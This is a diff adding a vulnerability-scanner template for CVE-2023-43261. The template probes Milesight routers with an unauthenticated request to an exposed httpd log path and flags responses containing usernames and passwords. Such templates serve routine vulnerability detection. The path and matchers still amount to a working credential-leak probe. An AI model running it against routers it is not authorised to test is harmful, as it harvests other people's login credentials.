@@ -1,0 +1,26 @@
+id: CVE-2023-43261
+info:
+  name: Milesight Router Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2023-43261,info-leak
+  description: |
+    A vulnerability in Milesight routers allows unauthenticated access to sensitive log files.
+http:
+  - method: GET
+    path:
+      - "/lang/log/httpd.log"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"status":"success"'
+      - type: word
+        part: body
+        words:
+          - "password"
+          - "username"
